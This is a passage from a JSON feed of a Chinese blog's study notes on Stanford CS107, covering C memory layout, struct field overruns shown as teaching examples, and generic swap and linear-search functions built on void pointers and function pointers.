punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">char</span> suid<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">int</span> numUnits<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>student pupils<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>numUnits <span class=\"token operator\">=</span> <span class=\"token number\">21</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token function\">strdup</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Adam\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//strdup 是内存复制的缩写，动态地分配足够的空间来存储字符串</span></pre></td></tr></table></figure><p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_3/image-20231102162141584.png\" alt=\"image-20231102162141584\"></p>\n<p>进行如下操作后，内存中的情况如下图所示</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> pupils<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>suid <span class=\"token operator\">+</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_3/image-20231102162918438.png\" alt=\"image-20231102162918438\"></p>\n<p>继续进行如下操作</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>suid<span class=\"token punctuation\">,</span><span class=\"token string\">\"40415xx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_3/image-20231102163240269.png\" alt=\"image-20231102163240269\"></p>\n<p>继续进行如下操作</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span><span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_3/image-20231102163922391.png\" alt=\"image-20231102163922391\"></p>\n<p>这样就会导致 student [0] 的 numUnits 会是一个非常大的数，但是 pupils [3].name 还是正常的 123456.</p>\n<p>继续进行如下操作</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pupils<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>suid<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">'A'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"4高级函数\"><a class=\"markdownIt-Anchor\" href=\"#4高级函数\">#</a> 4. 高级函数？</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>ap<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>bp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">int</span> temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>ap<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token operator\">*</span>ap <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>bp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token operator\">*</span>bp <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> x <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> y <span class=\"token operator\">=</span> <span class=\"token number\">117</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>x<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure>",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_4/",
            "url": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_4/",
            "title": "斯坦福编程范式CS107_4",
            "date_published": "2023-11-05T12:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_4\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_4\">#</a> 斯坦福编程范式 CS107_4</h1>\n<h2 id=\"使用c做出类似c中模板的效果\"><a class=\"markdownIt-Anchor\" href=\"#使用c做出类似c中模板的效果\">#</a> 使用 C 做出类似 C++ 中模板的效果</h2>\n<p>还是第三节中的交换函数，因为中间变量 temp 被声明为 int，所以系统就隐式默认这个在进行 4 字节的复制，所以我们不可能使用之前的函数进行 double 类型或者其他类型变量的交换。我们可以通过通用的指针类型 void * 来达到不提前限制类型的效果，它说明指向没有任何类型信息的某些东西。</p>\n<p>但如果你按照下述内容进行编码运行，就会出现问题</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp1<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">void</span> temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>vp1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token operator\">*</span>vp1 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>vp2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token operator\">*</span>vp2 <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>首先，void temp 会报错，因为不能将变量定义为 void 类型。其次，不能对 void * 进行解引用，因为机器不知道要取出来多少字节来作为操作的一部分。因此我们还需要第三个参数，大小 size。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp1<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp2<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span>size<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span>vp1<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 和 strcpy 很像，但它不会检测 \\0，所以需要人为设置需要拷贝的字节大小</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>vp1<span class=\"token punctuation\">,</span>vp2<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>vp2<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> x <span class=\"token operator\">=</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> <span class=\"token number\">37</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>x<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>y<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>现在假设我们有以下变量</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>husband <span class=\"token operator\">=</span> <span class=\"token function\">strdup</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Fred\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>wife <span class=\"token operator\">=</span> <span class=\"token function\">strdup</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wilma\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_4/image-20231103184829084.png\" alt=\"image-20231103184829084\"></p>\n<p>如果我们想将 husband 和 wife 的名字调换一下，我们实际上只需要将其所指的指针调换即可，使 husband 指向 wilma，使 wife 指向 Fred。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>husband<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>wife<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \t<span class=\"token comment\">// 这里需要取地址，因为我们实际上交换的就是 h 和 w 所指向的内容，当我们想要交换两\t\t\t\t\t\t\t\t\t\t// 个 int 变量时，我们传入的时 int *，那么我们想要交换两个 char * 变量时，应该\t\t\t\t\t\t\t\t\t\t  // 传入的是 char **</span></pre></td></tr></table></figure><p>但是如果你忘记加 &amp;，程序仍然会编译并运行</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span>husband<span class=\"token punctuation\">,</span>wife<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这样最终结果会直接改变两个字符串的值，分别为 wilm 和 Freda。</p>\n<h2 id=\"例子\"><a class=\"markdownIt-Anchor\" href=\"#例子\">#</a> 例子</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">lsearch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> key<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> array<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>size<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>key<span class=\"token punctuation\">)</span>   <span class=\"token comment\">// 这一步在位的层面上比较是的 4 个字节是否相等</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>如果我们想让这个函数泛化，不只是查找一个 int 类型的 key，就需要多加一些参数。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">lsearch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>key<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>base<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>n<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>base <span class=\"token operator\">+</span> i<span class=\"token operator\">*</span>elemSize<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 这里将 void * 类型转换成 char * 类型，以便编译器能进行运算</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>elemAddr<span class=\"token punctuation\">,</span>elemSize<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token keyword\">return</span> elemAddr<span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在内存层面，一个字节一个字节进行比较</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上述方法使用的是系统提供的比较函数，在下次课程中，将会使用下面的代码，在变量中加入了比较函数的指针 *cmpfn 来完成 memcmp 函数的功能。</p>\n<pre><code>void *lsearch(void *key, void *base,int n,int elemSize,int (*cmpfn)(void *,void *))&#123;\n\n&#125;\n</code></pre>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_5/",
            "url": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_5/",
            "title": "斯坦福编程范式CS107_5",
            "date_published": "2023-11-05T12:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_5\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_5\">#</a> 斯坦福编程范式 CS107_5</h1>\n<h2 id=\"接着上节课的例子\"><a class=\"markdownIt-Anchor\" href=\"#接着上节课的例子\">#</a> 接着上节课的例子</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">lsearch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>key<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>base<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>cmpfn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>n<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>base <span class=\"token operator\">+</span> i <span class=\"token operator\">*</span> elemSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">cmpfn</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>elemAddr<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">//cmpfn 函数就是比较传入的地址中的内容是否一样</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> elemAddr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面是一个使用上述函数的例子</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> array<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> size <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> number <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>found <span class=\"token operator\">=</span> <span class=\"token function\">lsearch</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>number<span class=\"token punctuation\">,</span>array<span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>IntCmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//IntCmp 是用来比较的函数，之后再进行实现</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">IntCmp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elem1<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elem2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>ip1 <span class=\"token operator\">=</span> elem1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>ip2 <span class=\"token operator\">=</span> elem2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">*</span>ip1 <span class=\"token operator\">-</span> <span class=\"token operator\">*</span>ip2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们再来举一个如果数组是字符串的例子</p>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_5/image-20231104095657611.png\" alt=\"image-20231104095657611\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> notes<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Ab\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"F#\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"B\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Gb\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"D\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>favoriteNote <span class=\"token operator\">=</span> <span class=\"token string\">\"Eb\"</span><span class=\"token punctuation\">;</span>\\</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>found <span class=\"token operator\">=</span> <span class=\"token function\">lsearch</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>favoriteNote<span class=\"token punctuation\">,</span>notes<span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>StrCmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//&amp;favoriteNote 是一个 char **</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">StrCmp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp1<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s1 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>vp1<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 强制转换为 char ** 再对其解引用</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s2 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>vp2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">,</span>s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//clib 中自带的一个字符一个字符的比较</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上述例子中，为何不直接将 vp 强制转换为 char * 类型的呢？因为我们的 notes 数组实际上相当于 char**，于是我们知道实际上 vp 与我们的字符串 &quot;Ab&quot; 之类的有两跳的距离，对 vp 解一次引用我们能得到的是指向字符串的首地址，再解一次引用得到的是字符串的首字符。strcmp 函数需要的是字符串的首地址，所以我们对 vp 强制转换为 char**，再解一次引用即可。如果直接使用 (char*) 